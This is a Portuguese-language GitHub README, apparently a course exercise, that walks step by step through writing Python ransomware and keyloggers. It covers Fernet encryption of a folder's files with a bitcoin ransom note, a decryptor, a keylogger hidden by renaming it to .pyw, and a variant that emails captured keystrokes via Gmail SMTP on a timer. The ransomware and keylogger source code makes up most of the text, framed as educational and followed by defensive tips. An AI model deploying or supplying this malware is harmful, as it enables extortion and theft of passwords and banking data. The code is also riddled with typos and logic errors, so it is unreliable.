# Dio-ransomware-e-keyloog

# RansomWare
______
## O que é ransomware?

O que é ransomware? é um tipo de software malicioso(malware) onde o intuito dele é capturar arquivos e criptografa-lo "com uma senha extremamente forte" , onde a vitima vai ser estorquida e o atacante vai forca-lo a pagar uma certa quantia e se nao pagar vai ter seus dados vazados, e em muitos casos a vitima ate paga para que o atacante devolva e o atacante some com os dados e o dinheiro.

## Como funciona o processo do ataque?

#### 1- Precisamos encontrar o arquivo alvo
#### 2- Criptografa este arquivo com uma chave que somente o atacante vai ter acesso. Logo em seguida o alvo vai ter perdido o acesso sobre o arquivo.
#### 3- Deixar uma mensagem dizendo Orientando o que deve ser feito para que tenha o acesso novamente sobre o arquivo furtado.

### Como fazer um arquivo Ransomware.

##### Primeiro precisa-mos ter a biblioteca do cryptography.fernet e a Fernet intalada no seu IDEs.

feito isto iremos começar.

```python
from cryptography.fernet import Fernet
import os
```
A biblioteca Cryptography: e a responsavel por fazer a criptografia.
Import os : e a responsavel por navegar nos arquivos da vitima.

1- Este primaria linha de comando é responsavel por salva a chave da criptografia:

```python
def gerar_chave():
    chave = Fernet.generate_key()
    with open("chave.key", "wb") as chave_file:
        chave_file.write(chave)
```

2- Esta é a responsavel pela funcao de carregar a chave salva do arquivo:

```python
def carregar_chave():\
    return open("chave.key", "rb").read()
```

3- Esta é a parte mais importante do script , pois sera a responsavel por, abrir o arquivo principal, ler todos os dados e depois criptografar, com a chave e sobre escrever com os dados criptografado:

```python
def criptografar_arquivo(arquivo, chave):
       f = Fernet(chave)
    with open(arquivo, "rb") as file:
        dados = file.read()
        dados_encriptados = f.encrypt(dados)
        with open(arquivo, "eb") as file:
            file.write(dados_encriptados)
```
            
<img width="646" height="415" alt="cripto" src="https://github.com/user-attachments/assets/bb532750-6b2c-444e-a796-6b2daaaac8cf" />
"<!-- no pc-->"
No pc do alvo ele fica desta forma, todo codificado.

4- Esta funcao sera a responsavel por vasculhar os arquivos dentro da pasta da vitima:

```python
def encontrar_arquivos(diretorio):
    lista = []
    for raiz, _, arquivos in os.qalk(diretorio):
        for nome in arquivos:
            caminho = os.path.join(raiz, nome)
            if nome != "ransoware.py" and.nome.endswith(".key"):
                lista.append(caminho)
     return lista
```
5- Aqui esta a onde a pessoa entra em desespero, pois este e o comando que manda uma mensagem ao alvo , onde o atacante vai comecar a trabalhar no psicologico do alvo:

```python
def mensagem_resgate():
    with open("LEIA ISTO.txt") as f:
        f.write("seus arquivos foram criptografados")
        f.write("para recuperar seus arquivos, envie 1 bitcoin para o endereco X e envie o comprovante!\n")
        f.write("Depois disso , enviaremos a chave para voce recuperar seus arquivos")
```

6- Aqui é o cerebro deste script e a funcao principal, onde ele faz as ordenanca da sequencia dos script , para que ele rode sem pular etapas:
```python
def main():
    gerar_chave()
    chave = carregar_chave()
    arquivos = encontrar_arquivos("test_files")
    for arquivo in arquivos:
        criptografar_arquivo(arquivo, chave)
       mensagem_resgate()
    print("ransoware executado com sucesso!")
```
  Para finalizar os comandos temos o:
```python
  if __name__ == "__main__":
    main ()
```
  Este tem a funcao de garantir que se a funcao man for execultada ela vai ser chamada.

  Feito todo este processo iremos execultar o codigo:

  Abra o terminal e digite
```
  python /ransoware.py
```
  Depois de execultar todos os arquivos da pasta , o arquivo estara totalmente criptografado e o alvo quando abrir o arquivo, perceberar que o mesmo vai esta todo codificado.

 Descriptografando o arquivo

 Temos que criar uma nova sessao no nosso IDEs, onde a funcao dele sera simples e direta, que e descriptografar o arquivo do alvo.

1- Usaremos a mesma biblioteca para reverter o arquivo:
```python
from cryptography.fernet import Fernet
import os
```
2- Esta tera a funcao de carregar a chave para descriptografar:
```python
def carregar_chave()
    return open("chave.key", "rb").read()
```
3- Ele sera o responsavel por levar os dados de volta para o arquivo alvo:
```python
def descriptografar_arquivo(arquivo, chave):
    f = Fernet(chave)
    with open(arquivo, "rb") as file:
        dados = file.read()
        dados_descriptografados = f.decrypt(dados)
    with open(arquivo, "wb") as file:
        file.write(dados_descriptografados)
```
4-Sua funcao sera de Abrir novamente o diretorio e encontrar o arquivo alvo:
```python
def encontrar_arquivos(diretorio):
    lista = []
    for raiz, _, arquivos in os.qalk(diretorio):
        for nome in arquivos:
            caminho = os.path.join(raiz, nome)
            if nome != "ransoware.py" and.nome.endswith(".key"):
                lista.append(caminho)
     return lista
```
5- Apos encontrar este comando vai fazer a Descriptografia do arquivo , fazendo com que o alvo possa ver de novo o que tinha sido capturado.
```python
def main():
     chave = carregar_chave()
    arquivos = encontrar_arquivos("test_files")
    for aruivo in arquivos:
        descriptografar_arquivo(arquivo, chave)
    print("Descriptografia concluida com sucesso!")
```
 ``` python
 if __name__ == "__main__":
        main()    
```
Quando terminar o processo de descriptografar , aparecera uma tela avisando que foi concluido o processo.
___________________________________________________________________________________________________________________________________________________________________

# KEYLOGGER

## O que é Keylogger?
Keylogger é um tipo de malware que seu objetivo é resgatar tudo que a vitima escrever em seu teclado é gravado em um arquivo , isto inclui senhas, dados bancarios e todo tipo de informacoes que voce digitar em seu computador.

### Como criar um arquivo de teste para este malware
Veremos a seguir como um script simples, pode ter um poder imenso sobre dados do seu pc.

Para iniciarmos precisamos primeiramente baixar a biblioteca de pynput que é responsavel por permitir o monitoramento do teclado da vitima em tempo real.
Toda vez que uma tecla for acionada "precionada" ele vai chamar uma funcao automaticamente no codigo.
```
pip install pynput
```
1- Depois de instalado vamos começar orientando qual a biblioteca iremos usar

```python
from pynput import keyboard
```

2- logo em vamos usar um comando para ignorar , Onde tirare-mos algumas teclas que nao queremos que grave em nosso log

```python
IGNORAR = {
    keyboard.Key.shift,
    keyboard.Key.shift_r,
    keyboard.Key.ctrl_l,
    keyboard.Key.ctrl_r,
    keyboard.Key.alt_l,
    keyboard.Key.alt_r,
    keyboard.Key.caps_lock,
    keyboard.Key.cmd,
}

```
3- Depois de fazer a lista de teclas ignoradas, iremos dar a funcao` ****on_press**** `é uma funcao de extrema importancia, pois toda vez que o teclado for precionado, automaticamente ela sera chamada. 

3a-E dentro do dela iremos usar um comando chamado `***TRY***` que tem a funcao de tentar capturar os caracteres do teclado se for uma tecla normal" como uma letra ou numero". 

3b-A funcao `***char*** `vai ser responsavel por escrever os caracteres em um arquivo chamado "log.txt"

```python
def on_press(Key):
            Try:
               #se for uma tecla normal, escreva-la no arquivo (letra, numero, simbolo)
             with open("log.txxt", "a", Encoding="utf-8") as f:
            f.write(Key.char)
```

4- Agora iremos organizar as teclas que nao sao considerada caracteres como " enter, espaco, backspace"
```python
 except.AttributeError:
            with open("log.txt", "a" encoding="utf-8") as f:
                if Key not in IGNORAR:
                       f.write("  ")
                elif key == keyboard.Key.enter:
                       f.write("\n")   
                elif key == keyboard.Key.tab:
                    f.write(" \t")
                elif Key == keyboard.Key.backspace:
                       f.write("  ")
                elif key == keyboard.Key.esc:
                       f.write(" [esc ]")
                elif key in IGNORAR:
                        pass
                else    :
                    f.write(f" [{Key}] ")
```
Sem este comando se tentarmos capturar estas teclas ele vai dar como except, por isto temos que orientar os except, para corrigir nesta situacao.

Para finalizar usaremos:

```python
 with keyboard.Listener(on_press=on_press) as listener:
                        listener.join()

```

`Listener: É a onde iniciamos o comando de esculta`

`Listener.join : Este vai manter o script rodando ate que ele seja interrompido de forma manual.`

O comando ja esta quase pronto

#### Abrindo o terminal

Colocaremos o comando 

```
ren .\keylogger.py .\keylogger.pyw
```
Com este comando ele irar mudar a extencao do arquivo, fazendo com que ele comece a rodar em segundo plano no windowns, assim o keylloger vai ficar invisivel no pc da vitima.

Para que o script comece a rodar usaremos o comando:

```
python .\keylogger.pyw
```
com este comando o key ja estara rondando de forma invisivel na maquina do alvo e capturando cada tecla precionada em tempo real em seu py.

### Agora iremos Para a etapa seguinte que é fazer um Keylogger que manda as mensagem via e-mail

Para que funcione precisamos criar um e-mail no gmail , para poder fazer os testes e depois configurar este e-mail para que ele possa receber os logs.

Vamos comecar importando as bibliotecas, para que o script possa funcionar perfeitamente.

```python
from pynput import keyboard
import smtplib
from email.mime.text import MIMEText
from threading import Timer 

log = ""
```
`Pynput : monitorar e controlar dispositivos de entrada, especificamente o mouse e o teclado`

`smtplib: Tem a funcao de formatar como mensagem de texto`

`Time da biblioteca threading: Sera o que nos permitirar fazer os agendamentos dos envios de tempo em tempo
`

Depois de importa as bibliotecas iremos comecar as configuracoes do email.
```python
# Configurações do email
EMAIL_ORIGEM = "seu_email@gmail.com"
EMAIL_DESTINO = "email_destino@gmail.com"
SENHA_EMAIL = "sua_senha"
```
Aqui é uma parte importante pois , esta parte fica a parte dos armazenamento dos logs para no tempo certo ele manda para o email.
Tambem fica a rotacao do servidor , onde o script faz com que ele logue na conta, envie o texto , limpe a log e saia do email. 
Isto garante a boa funcionabilidade do script .
```python
def enviar_email():
    global log
    if log:
        msg = MIMEText()
        msg['Subject'] = "Dados Capturados pelo Keylogger"
        msg['From'] = EMAIL_ORIGEM
        msg['To'] = EMAIL_DESTINO   
    try:
        server = smtplib.SMTP('smtp.gmail.com', 587)
        server.starttls()
        server.login(EMAIL_ORIGEM, SENHA_EMAIL )
        server.send_message(msg)
        server.quit()
    except Exception as e:
        print(f"Erro ao enviar email: {e}")
    log = ""
```
Aqui é onde o agente faz o envio a cada periodo de tempo, onde o tempo que configura é o atacante. Pode ser a cada 60 segundou ou o tempo que achar melhor.
```python
    Timer(600, enviar_email).start()
```
 Agora iremos organizar as teclas que nao sao considerada caracteres como " enter, espaco, backspace"
```python
def on_press(Key):
    global log
    try:
        with open("log.txt", "a", encoding="utf-8") as f:
            f.write(Key.char)
            log += Key.char
    except AttributeError:
        with open("log.txt", "a", encoding="utf-8") as f:
            if Key == keyboard.Key.space:
                f.write("  ")
                log += "  "
            elif Key == keyboard.Key.enter:
                f.write("\n")
                log += "\n"
            elif Key == keyboard.Key.tab:
                f.write(" \t")
                log += " \t"
            elif Key == keyboard.Key.backspace:
                f.write(" < ")
                log += "  "
            elif Key == keyboard.Key.esc:
                f.write(" [esc] ")
                log += " [esc] "
            elif Key in IGNORAR:
            else:
                pass # Ignorar teclas como Shift, Ctrl, Alt, etc.
```
Sem este comando se tentarmos capturar estas teclas ele vai dar como except, por isto temos que orientar os except, para corrigir nesta situacao.

Para finalizar usaremos:
```python
# Iniciar o keylogger e o envio de email

with keyboard.Listener(on_press=on_press) as listener:
    enviar_email()  # Iniciar o envio de email
    listener.join()

```

Depois de finalizar o scrript use o comando:

```
python .\keylogger_email.py
```

Pronto o script ja vai estar rodando e mandando os caracteres para seu e-mail.

## Uma breve reflexao

Depois de concluir este modulo , e este curso , percebo o quao vuneravel estamos na internet, nao por falta de seguranca pois temos programas como antivirus , firewalls e ferramentas de monitoramentos , mas pela falta de conhecimento que temos, vivemos em uma era onde tudo que nos fazemos esta no celular ou no computador, onde acesso a bancos, pix, documentos,etc.. Tudo esta conectada na internet, e nos nao temos uma certa precaução com os meios que usamos, qualquer link clickado, qualquer arquivo aberto, qualquer programa execultado, nao tomamos o minimo de cautela.
Vemos aqui neste Aprendizado, que scripts simples de +- 50 linhas , pode fazer estragos dependendo do caso gigantesco , pois nao e so a perca do dinheiro, e a perca da privacidade , onde talvez um documento de extrema importancia foi criptografado e voce vai esta a merce de alguem que vai te estorqui, fazer pressao psicologica " famosa engenharia social" e roubar teu dinheiro por um descuido seu, que talvez depois de voce pagar o que ele quer, ele mesmo assim pode vazar os seus dados ou simplismente so sumir.
#### Para voce que quer se previnir aqui vai algumas dicas
1- antivirus :
O antivirus modernos vai usar mais que uma lista de aquivos maliciosos, ele vai analizar os comportamentos dos programas, vai detectar padroes de ataques e vai bloquear as atividades suspeitas. " nunca use um antivirusa crackeado pois dentro dele voce pode deixar alguma por aberta para o invasor"

2- Firewall:
O firewall tanto de sistema quanto de rede ele vai ajudar a controlar o trafego que entra e sai da sua maquina. Sempre mantenha ele atualizado.

3-Programa de Monitoramento 
Esta ferramenta vai monitorar o comportamento dos aplicativos. Estes programas mais modernos usam ia e machine learning para fazer as detecção de comportamentos estranho " anormais"

4- Concientizacao
Este esta acima de qualquer antivirus e firewall, Nao se deve sair clickando em tudo que ver, seja mais cauteloso , tenha sempre em mente que praticamente quase tudo hoje esta em seu celular ou pc, pois desde pagamentos ate documentos fazemos quase tudo online.

5- Ultilizar ambientes isolados
Voce que quer testar algum codigo desconhecido, abrir um arquivo suspeito ou fazer algo do tipo, use sempre uma vm " maquina virtual" , isso vai criar uma barreira entre seu sistema real e o ambiente de teste, vai previnir que se algo malicioso ou danoso esteja dentro do arquivo, ele nao corrompa seu sistema ou comprometa algum arquivo. 

`"A MELHOR DEFESSA CONTRA ESTES MALWARES E O CONHECIMENTO"` Isadora ferrao
#### Todo o conteudo Feito aqui e para fins Educacionais , nada disso deve ser usado fora de um ambiente de testes , o ponto principal e o aprendizado e ver na pratica como estes malwares realmente fuciona para conseguir se proteger e consientizar as demais.
